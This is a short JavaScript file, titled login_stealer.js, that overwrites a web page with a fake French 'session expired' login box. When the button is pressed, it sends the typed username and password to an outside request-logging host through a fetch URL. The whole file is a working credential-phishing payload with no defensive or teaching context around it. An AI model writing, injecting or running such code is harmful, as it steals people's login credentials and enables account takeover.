// login_stealer.js
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;background:white;padding:20px;z-index:9999;">
    <h3>Votre session a expiré :</h3>
    <input id="user" placeholder="Identifiant">
    <input id="pass" placeholder="Mot de passe" type="password">
    <button onclick="steal()">Valider</button>
  </div>
`;

function steal() {
  fetch('https://requestinspector.com/inspect/123?user=' + user.value + '&pass=' + pass.value);
}